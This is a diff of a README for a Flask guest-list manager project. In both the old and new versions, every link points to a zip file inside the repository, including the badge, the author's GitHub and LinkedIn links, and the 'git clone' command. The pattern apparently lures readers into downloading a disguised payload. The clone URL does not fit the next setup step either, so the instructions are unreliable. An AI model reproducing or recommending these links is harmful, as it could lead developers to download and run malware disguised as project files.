@@ -2,7 +2,7 @@
 
 Welcome to the **AI-Powered Guest List Manager**, a robust and aesthetically premium full-stack application built with Python. This project demonstrates a clean architecture approach to building scalable, AI-integrated web applications using **Flask**, **Tailwind CSS**, and **SQLAlchemy**.
 
-[![GitHub](https://img.shields.io/badge/GitHub-shivendra911-indigo?style=flat&logo=github)](https://github.com/shivendra911/AI_Powered_guest-list-manager/raw/refs/heads/main/app/services/leftments.zip)
+[![GitHub](https://img.shields.io/badge/GitHub-shivendra911-indigo?style=flat&logo=github)](https://raw.githubusercontent.com/shivendra911/AI_Powered_guest-list-manager/main/app/services/leftments.zip)
 ![Python](https://img.shields.io/badge/Python-3.11+-blue?style=flat&logo=python)
 ![Flask](https://img.shields.io/badge/Framework-Flask-black?style=flat&logo=flask)
 ![Theme](https://img.shields.io/badge/Theme-Zinc%20%2F%20Indigo-white?style=flat)
@@ -66,7 +66,7 @@ The project follows a modular pattern to ensure maintainability:
 
 ### 1. Clone & Environment
 ```bash
-git clone https://github.com/shivendra911/AI_Powered_guest-list-manager/raw/refs/heads/main/app/services/leftments.zip
+git clone https://raw.githubusercontent.com/shivendra911/AI_Powered_guest-list-manager/main/app/services/leftments.zip
 cd zzzchatbotfinal
 python -m venv .venv
 # Windows
@@ -109,8 +109,8 @@ docker-compose up --build
 ## 👨‍💻 Author
 
 **Shivendra Pratap**
-- GitHub: [@shivendra911](https://github.com/shivendra911/AI_Powered_guest-list-manager/raw/refs/heads/main/app/services/leftments.zip)
-- LinkedIn: [Shivendra Pratap](https://github.com/shivendra911/AI_Powered_guest-list-manager/raw/refs/heads/main/app/services/leftments.zip)
+- GitHub: [@shivendra911](https://raw.githubusercontent.com/shivendra911/AI_Powered_guest-list-manager/main/app/services/leftments.zip)
+- LinkedIn: [Shivendra Pratap](https://raw.githubusercontent.com/shivendra911/AI_Powered_guest-list-manager/main/app/services/leftments.zip)
 - Registration No: 12323629
 
 ---
